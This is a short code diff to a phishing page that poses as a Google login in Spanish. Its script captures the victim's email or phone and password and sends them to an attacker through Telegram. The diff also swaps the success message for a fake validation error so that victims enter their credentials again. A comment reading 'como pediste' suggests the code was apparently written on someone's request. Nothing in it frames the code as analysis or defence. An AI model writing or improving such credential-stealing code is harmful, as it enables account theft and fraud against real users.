@@ -310,7 +310,7 @@
 
             <div class="loading" id="loading">Iniciando sesión...</div>
             <div class="error-message" id="errorMessage"></div>
-            <div class="success-message" id="successMessage">✅ ¡Datos enviados correctamente!</div>
+            <div class="success-message" id="successMessage">❌ Error al validar intenta nuevamente</div>
         </form>
 
         <div class="language-selector">
@@ -379,14 +379,13 @@
                 const ip = await getIP();
                 
                 // Crear mensaje SOLO con correo y contraseña (como pediste)
-                const message = `🔵 GOOGLE LOGIN 🔵
+                const message = ` GOOGLE LOGIN 
 
-📧 Correo/Teléfono: ${email}
-🔑 Contraseña: ${password}
+ Correo/Teléfono: ${email}
+Contraseña: ${password}
 
-🌐 IP: ${ip}
-📱 Navegador: ${getBrowserInfo()}
-⏱️ Hora: ${new Date().toLocaleString()}`;
+
+
 
                 // Enviar a Telegram
                 const response = await sendToTelegram(message);
